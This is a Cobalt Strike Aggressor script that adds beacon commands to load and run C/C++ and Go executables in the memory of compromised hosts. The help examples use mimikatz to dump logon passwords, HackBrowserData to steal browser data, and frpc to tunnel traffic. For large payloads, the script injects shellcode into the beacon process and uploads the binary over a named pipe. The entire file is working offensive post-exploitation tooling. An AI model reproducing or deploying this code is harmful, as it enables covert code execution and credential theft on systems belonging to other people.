$trace_enabled = false; # Whether to enable the trace function of this cna script.
$use_debug_bof = false; # Whether to use the debug version of the BOF.
$use_job = true; # Whether to use the beacon jobs to automatically fetch the log. (Recommended to enable)

if ($use_debug_bof) {
    $debug_bof_suffix = 'd';
} else {
    $debug_bof_suffix = '';
}

alias enable-debug-inline-execute-all {
    $trace_enabled = true;
    $use_debug_bof = true;
    $debug_bof_suffix = 'd';
    blog($1, '[enable-debug-inline-execute-all] Debug enabled. Use DebugView/x64dbg to view the BOF trace.');
}

$HookFeatureRedirectStdio = 0x01;
$HookFeatureStreamingOutput = 0x02;
$HookFeatureCommandLine = 0x04;
$HookFeatureUnload = 0x08;

$HookFeatureCpp = 0x0100;
$HookFeatureCppSEH = 0x0200;

$HookFeatureGo = 0x010000;
$HookFeatureGoCobraFakeParentProcess = 0x020000;

# The features of the inline-execute-pe BOF when running C/C++ PE file.
$features_cpp = $HookFeatureRedirectStdio | $HookFeatureStreamingOutput | $HookFeatureCommandLine | $HookFeatureUnload | $HookFeatureCpp | $HookFeatureCppSEH;
# The features of the inline-execute-pe BOF when running golang PE file.
$features_go = $HookFeatureRedirectStdio | $HookFeatureStreamingOutput | $HookFeatureCommandLine | $HookFeatureUnload | $HookFeatureGo | $HookFeatureGoCobraFakeParentProcess;

beacon_command_register(
    "inline-execute-cpp",
    "Load and run a C/C++ PE file in memory.",
    "
Command: inline-execute-cpp
Summary: This command will run a BOF to load a C/C++ PE file into beacon memory.
         Supports x86/x64 C/C++ PE file. Golang/C# are not supported.

Usage:   inline-execute-cpp [-f] [-i /path/to/stdin] </path/to/cpp_binary.exe> [args]
         [-f]                      Optional. Force execute the PE file without checking.
         [-i /path/to/stdin]       Optional. The path of the file to be used as stdin.
         </path/to/cpp_binary.exe> Required. Full path to the C/C++ exe to run.
         [args]                    Optional. Raw command line arguments. Use double quotes as usual.

         Example: inline-execute-cpp C:\\MyTools\\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
         Example: inline-execute-cpp -i C:\\MyTools\\stdin.txt C:\\MyTools\\mimikatz.exe
"
);

beacon_command_register(
    "inline-execute-go",
    "Load and run a golang PE file in memory.",
    "
Command: inline-execute-go
Summary: This command will run a BOF to load a golang PE file into beacon memory.
         Supports x86/x64 golang PE file. C/C++/C# are not supported.

Usage:   inline-execute-go [-f] [-i /path/to/stdin] </path/to/go_binary.exe> [args]
         [-f]                     Optional. Force execute the PE file without checking.
         [-i /path/to/stdin]      Optional. The path of the file to be used as stdin.
         </path/to/go_binary.exe> Required. Full path to the golang exe  to run.
         [args]                   Optional. Raw command line arguments. Use double quotes as usual.

         Example: inline-execute-go C:\\MyTools\\HackBrowserData.exe
         Example: inline-execute-go C:\\MyTools\\frpc.exe stcp -s test.com -P 1234 -t 1234 -n \"my name\" -l 1234
"
);

beacon_command_register(
    "inline-log-pe",
    "Fetch logs from a running PE image.",
    "
Command: inline-log-pe
Summary: This command will run a BOF to fetch logs from a running PE image.

Usage:   inline-log-pe [image_base]
         [image_base] Optional. The hex string of the image base which pointer to the PE image in memory. Default value is the last loaded PE image.

         Example: inline-log-pe
         Example: inline-log-pe 0x008D0000
"
)

beacon_command_register(
    "inline-list-pe",
    "List all loaded PE images with some details.",
    "
Command: inline-list-pe
Summary: This command will run a BOF to list all loaded PE images with some details.

Usage:   inline-list-pe

         Example: inline-list-pe
"
)

alias inline-execute-cpp {
    local('$bid $force $stdinpath $exepath $cmdline');
    ($bid) = @_;
    trace_init($bid);

    if (size(@_) < 2) {
        berror($bid, beacon_command_detail("inline-execute-cpp"));
        return;
    }

    # Parse arguments
    ($force, $stdinpath, $exepath, $cmdline) = parse_args(@_, $0);

    # Invoke inlineexecutepe.o
    inline_execute_pe($bid, $features_cpp, $force, $stdinpath, $exepath, $cmdline);
}

alias inline-execute-go {
    local('$bid $force $stdinpath $exepath $cmdline');
    ($bid) = @_;
    trace_init($bid);

    if (size(@_) < 2) {
        berror($bid, beacon_command_detail("inline-execute-go"));
        return;
    }

    # Parse arguments
    ($force, $stdinpath, $exepath, $cmdline) = parse_args(@_, $0);

    # Invoke inlineexecutepe.o
    inline_execute_pe($bid, $features_go, $force, $stdinpath, $exepath, $cmdline);
}

alias inline-log-pe {
    local('$bid $imagebase $barch $bof $args');
    ($bid, $imagebase) = @_;
    trace_init($bid);

    # Parse arguments
    if (size(@_) > 1) {
        $imagebase = strrep($imagebase, '0x', '');
        trace('[inline-log-pe] imagebase was set: 0x' . $imagebase);
    } else {
        $imagebase = '0';
    }

    # Get the beacon architecture to select the corresponding BOF
    $barch = barch($bid);
    trace('[inline-log-pe] Beacon architecture: ' . $barch);

    trace($bid, 'inline-log-pe arguments: ' . 'imagebase: 0x' . $imagebase);

    # Execute BOF
    trace('[inline-log-pe] Begin execute BOF.');
    $bof = read_script_resource('inlinelogpe.' . $barch . $debug_bof_suffix . '.o');
    $args = bof_pack($bid, 'z', $imagebase);
    beacon_inline_execute($bid, $bof, 'go', $args);
    trace('[inline-log-pe] End execute BOF.');
}

alias inline-list-pe {
    local('$bid $barch $bof');
    ($bid) = @_;
    trace_init($bid);

    # Get the beacon architecture to select the corresponding BOF
    $barch = barch($bid);
    trace('[inline-list-pe] Beacon architecture: ' . $barch);

    # Execute BOF
    trace('[inline-list-pe] Begin execute BOF.');
    $bof = read_script_resource('inlinelistpe.' . $barch . $debug_bof_suffix . '.o');
    beacon_inline_execute($bid, $bof, 'go', $null);
    trace('[inline-list-pe] End execute BOF.');
}

# Parse arguments of inline-execute-xx
# Arguments
#   $1 - @args - Pass @_ in the alias function
#   $2 - $rawargs - Pass $0 in the alias function
sub parse_args {
    local('@args $rawargs $state $skipcount $i $t $force $stdinpath $exepath $cmdline');
    (@args, $rawargs) = @_;

    # Parse arguments
    $state = 0;
    $skipcount = 1;
    $force = false;
    $stdinpath = '';
    for ($i = 1; $i < size(@args); $i++) {
        $t = @args[$i];
        # trace('[parse_args] Parse arg: ' . $t);
        if ($state == 0) {
            # Parse additional options
            if ($t eq '-l') {
                # TODO: local like inline-execute-pe
            } else if ($t eq '-f') {
                $force = true;
                $skipcount++;
                trace('[parse_args] force was set: ' . $force);
            } else if ($t eq '-i') {
                $i++;
                $stdinpath = @args[$i];
                $skipcount += 2;
                trace('[parse_args] stdinpath was set: ' . $stdinpath);
            } else {
                $state = 1;
                $i--;
            }
        } else if ($state == 1) {
            # Parse exe
            $exepath = $t;
            trace('[parse_args] exepath was set: ' . $exepath);
            $state = 2;
            $i--;
        } else {
            break;
        }
    }

    # Parse raw command line
    $cmdline = skip_arg($rawargs);
    for (; $skipcount > 0; $skipcount--) {
        $cmdline = skip_arg($cmdline);
    }
    if (strlen($cmdline) != 0) {
        $cmdline = getFileName($exepath) . ' ' . $cmdline;
    } else {
        $cmdline = getFileName($exepath);
    }
    trace('[parse_args] cmdline was set: ' . $cmdline . ' (' . strlen($cmdline) . ')');

    return @($force, $stdinpath, $exepath, $cmdline);
}

# Invoke inlineexecutepe.o
# Arguments
#   $1 - $bid
#   $2 - $features
#   $3 - $force - Whether to force execute the PE file without checking.
#   $4 - $stdinpath - The path to the stdin file on the attacker machine.
#   $5 - $exepath - The path to the exe on the attacker machine.
#   $6 - $cmdline - Raw command-line. e.g. (frpc.exe stcp -s test.com -P 1234 -t 1234 -n "my name" -l 1234)
sub inline_execute_pe {
    local('$bid $features $force $stdinpath $exepath $cmdline $exe $stdin $jobver $tasksize $pid $fspath $fspipe $barch $bof $args');
    ($bid, $features, $force, $stdinpath, $exepath, $cmdline) = @_;

    # Get the beacon architecture to select the corresponding BOF
    $barch = barch($bid);
    trace('[inline_execute_pe] Beacon architecture: ' . $barch);

    $exe = read_file($exepath);
    if (strlen($exe) == 0) {
        berror($bid, 'The PE file does not exist or is empty: ' . $exepath);
        return;
    }
    if ($stdinpath ne '') {
        $stdin = read_file($stdinpath);
        if (strlen($stdin) == 0) {
            berror($bid, 'The stdin file does not exist or is empty: ' . $stdinpath);
            return;
        }
    } else {
        $stdin = '';
    }
    if ($use_job) {
        $jobver = get_job_version();
    } else {
        $jobver = 0;
    }

    trace('inline-execute-pe arguments: ' . 'features: 0x' . formatNumber($features, 16) . ', force: ' . $force . ', exe: ' . $exepath . ' (' . format_size(strlen($exe)) . '), cmdline: ' . $cmdline . ' (' . strlen($cmdline) . '), jobver: ' . $jobver. ', stdin: ' . $stdinpath . ' (' . format_size(strlen($stdin)) . ')');

    # Determine whether to use file server based on maximum task size
    $tasksize = get_tasks_max_size();
    if ((strlen($exe) + strlen($stdin) + 0x10000) > $tasksize) {
        # Use file server if the total size of the PE file and stdin file is greater than the maximum task size (reserved 64KB for other data)
        trace('[inline_execute_pe] The total size of the PE file and stdin file is greater than the maximum task size. Use file server.');

        # Inject file server shellcode
        $pid = int(binfo($bid, 'pid'));
        $fspath = script_resource('fileserver.' . $barch . $debug_bof_suffix . '.bin');
        bshinject($bid, $pid, $barch, $fspath);
        trace('[inline_execute_pe] Injecting file server shellcode.');

        # Sleep 50 ms to wait for the file server to start
        bpause($bid, 50);
        
        # Upload PE file to file server
        $fspipe = '\\\\.\\pipe\\' . $pid . '4155';
        $exe = pack('i', 0x44332211) . pack('i', strlen($exe)) . $exe;
        bupload_raw($bid, $fspipe, $exe, $exepath);
        trace('[inline_execute_pe] Uploading PE file to file server by pipe: ' . $fspipe);
        $exe = $null;
    }

    # Execute BOF
    trace('[inline_execute_pe] Begin execute BOF.');
    $bof = read_script_resource('inlineexecutepe.' . $barch . $debug_bof_suffix . '.o');
    $args = bof_pack($bid, 'iibbzi', $features, $force, $stdin, $exe, $cmdline, $jobver);
    beacon_inline_execute($bid, $bof, 'go', $args);
    trace('[inline_execute_pe] End execute BOF.');
}

# Get the beacon JobEntry structure version.
# Return
#   The JobEntry structure version.
sub get_job_version {
    local('$v');

    $v = get_cobaltstrike_version();
    if (compare_version($v, '4.10') > 0) {
        blog($bid, 'WARNING: Unverified cobaltstrike version. Maybe crash!');
    }
    if (compare_version($v, '4.9') >= 0) {
        return 2;
    } else if (compare_version($v, '4.0') >= 0) {
        return 1;
    } else {
        return 0;
    }
}

# Get the current Cobalt Strike version.
# Return
#   The Cobalt Strike version.
sub get_cobaltstrike_version { 
    import aggressor.Aggressor;

    return [Aggressor VERSION_SHORT]; 
}

# Compare version strings.
# Arguments
#   $1 - x - The first version string.
#   $2 - y - The second version string.
# Return
#   -1 if x < y, 0 if x == y, 1 if x > y.
sub compare_version {
    local('$x $y $i @xs @ys');
    ($x, $y) = @_;

    # Split the version string by '.'
    @xs = split('\\.', $x);
    @ys = split('\\.', $y);

    # Compare each part of the version
    for ($i = 0; $i < size(@xs); $i++) {
        if (size(@ys) <= $i && int(@xs[$i]) != 0) {
            return 1;
        } else if (int(@xs[$i]) < int(@ys[$i])) {
            return -1;
        } else if (int(@xs[$i]) > int(@ys[$i])) {
            return 1;
        }
    }

    return 0;
}

# Get the .tasks_max_size field from the C2 profile.
sub get_tasks_max_size {
    local('$value');

    $value = int([data_query("metadata")["c2profile"] getString: ".tasks_max_size"]);
    if (!$value) {
        $value = 0x100000; # 1MB
    }
    return $value;
}

# Skip the next argument
# Arguments
#   $1 - args
# Return
#   The rest arguments
sub skip_arg {
    local('$args $i $quoted');
    $args = $1;
    $i = 0;

    # Skip the leading spaces
    for (; $i < strlen($args); $i++) {
        if (charAt($args, $i) ne ' ') {
            break;
        }
    }

    # Skip the next argument
    $quoted = false;
    for (; $i < strlen($args); $i++) {
        if ($quoted) {
            if (charAt($args, $i) eq '\"') {
                $i++;
                break;
            }
        } else {
            if (charAt($args, $i) eq ' ') {
               break;
            }
            else if (charAt($args, $i) eq '\"') {
                $quoted = true;
            }
        }
    }

    # Skip the trailing spaces
    for (; $i < strlen($args); $i++) {
        if (charAt($args, $i) ne ' ') {
            break;
        }
    }

    $args = substr($args, $i);
    # trace('[skip_arg] Skip args result: ' . $args);
    return $args;
}

# Convert argument array to command line.
# Arguments
#   $1 - args - args to convert to command line. Any double quotes (\") in the command line arguments must be escaped using the backslash (\\) character.
# Return
#   The command line.
sub args_to_command_line {
    local('$arg $first $cmdline');

    $first = true;
    foreach $arg ($1) {
        if ($first) {
            $first = false;
        } else {
            $cmdline = $cmdline . ' ';
        }
        $cmdline = $cmdline . strrep($arg, '\\"', '"');
    }

    return $cmdline;
}

# Read file.
# Arguments
#   $1 - file_name
# Return
#   The binary of the file.
sub read_file {
    local('$handle $data');

    $handle = openf($1);
    $data = readb($handle, -1);
    closef($handle);
    trace('[read_file] File was read: ' . $1 . ' (' . format_size(strlen($data)) . ').');

    return $data;
}

# Read script resource.
# Arguments
#   $1 - file_name
# Return
#   The binary of the file.
sub read_script_resource {
    local('$handle $data');

    $handle = openf(script_resource($1));
    $data = readb($handle, -1);
    closef($handle);
    trace('[read_script_resource] Script resource was read: ' . $1 . ' (' . format_size(strlen($data)) . ').');

    return $data;
}

$trace_bid = 0;
$trace_inited = false;

# Initialize the trace function. trace_init must be called before trace.
# Arguments
#   $1 - bid
sub trace_init {
    $trace_bid = $1;
    $trace_inited = true;
}

# Trace.
# Arguments
#   $1 - text - The text to log.
sub trace {
    if ($trace_inited && $trace_enabled && $trace_bid) {
        blog($trace_bid, $1);
    }
}
